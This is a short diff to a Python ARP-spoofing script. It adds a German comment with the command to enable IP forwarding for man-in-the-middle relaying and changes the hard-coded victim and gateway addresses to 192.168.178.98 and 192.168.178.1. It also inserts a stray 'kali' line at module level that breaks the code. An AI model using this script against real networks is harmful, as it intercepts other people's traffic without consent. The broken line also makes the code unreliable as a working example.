@@ -4,6 +4,8 @@ import time
 import os
 import sys
 
+##### ip forwarding aktivieren: sudo sysctl -w net.inet.ip.forwarding=1
+
 def get_mac(ip):
     """
     Returns MAC address of any device connected to the network
@@ -50,12 +52,12 @@ def restore(target_ip, host_ip, verbose=True):
     send(arp_response, verbose=0, count=7)
     if verbose:
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
-
+kali
 if __name__ == "__main__":
     # victim ip address
-    target = "192.168.1.100"
+    target = "192.168.178.98"
     # gateway ip address
-    host = "192.168.1.1"
+    host = "192.168.178.1"
     # print progress to the screen
     verbose = True
     try:
